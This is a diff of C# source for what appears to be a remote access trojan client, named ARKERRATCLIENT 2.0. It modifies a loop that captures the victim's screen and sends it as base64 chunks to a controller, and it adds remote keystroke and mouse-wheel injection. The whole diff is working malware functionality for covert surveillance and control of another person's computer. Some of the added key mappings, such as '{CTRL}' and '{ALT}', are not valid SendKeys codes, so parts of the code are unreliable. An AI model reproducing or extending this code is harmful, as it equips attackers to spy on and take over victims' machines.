@@ -100,22 +100,24 @@ namespace ARKERRATCLIENT2._0
 
         public static async Task StartScreenStreaming(int quality)
         {
-            sendingFrames = true;
+            
+                sendingFrames = true;
 
-            while (sendingFrames)
-            {
-                // Capture screenshot
-                Bitmap screenshot = CaptureScreenshot(quality);
+                while (sendingFrames && !RATClientSession.noConnection)
+                {
+                    // Capture screenshot
+                    Bitmap screenshot = CaptureScreenshot(quality);
 
-                // Convert the screenshot to a list of base64-encoded chunks
-                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
+                    // Convert the screenshot to a list of base64-encoded chunks
+                    List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
 
-                // Send the chunks to the client
+                    // Send the chunks to the client
                 await SendChunks(chunks);
 
-                // Optional delay between frames (adjust as needed)
-                await Task.Delay(1); 
-            }
+                    // Optional delay between frames (adjust as needed)
+                    await Task.Delay(1);
+                }
+            
         }
 
         private static Bitmap CaptureScreenshot(int quality)
@@ -211,7 +213,7 @@ namespace ARKERRATCLIENT2._0
                 {
                     for (int i = 0; i < delta; i++)
                     {
-                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, 120);
+                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, 1);
                     }
                 }
                 // Scrolling down
@@ -219,7 +221,7 @@ namespace ARKERRATCLIENT2._0
                 {
                     for (int i = 0; i > delta; i--)
                     {
-                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, -120);
+                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, -1);
                     }
                 }
             }
@@ -267,6 +269,14 @@ namespace ARKERRATCLIENT2._0
             {
                 SendKeys.SendWait("{TAB}");
             }
+            else if(keystroke == "oemperiod")
+            {
+                SendKeys.SendWait(".");
+            }
+            else if (keystroke =="leftshift")
+            {
+                SendKeys.SendWait("+");
+            }
             else if(keystroke == "back")
             {
                SendKeys.SendWait("{BACKSPACE}");
@@ -278,6 +288,14 @@ namespace ARKERRATCLIENT2._0
             else if(keystroke == "return")
             {
                 SendKeys.SendWait("{ENTER}");
+            }
+            else if (keystroke == "leftctrl")
+            {
+                SendKeys.SendWait("{CTRL}");
+            }
+            else if (keystroke == "system")
+            {
+                SendKeys.SendWait("{ALT}");
             }
             else
             {
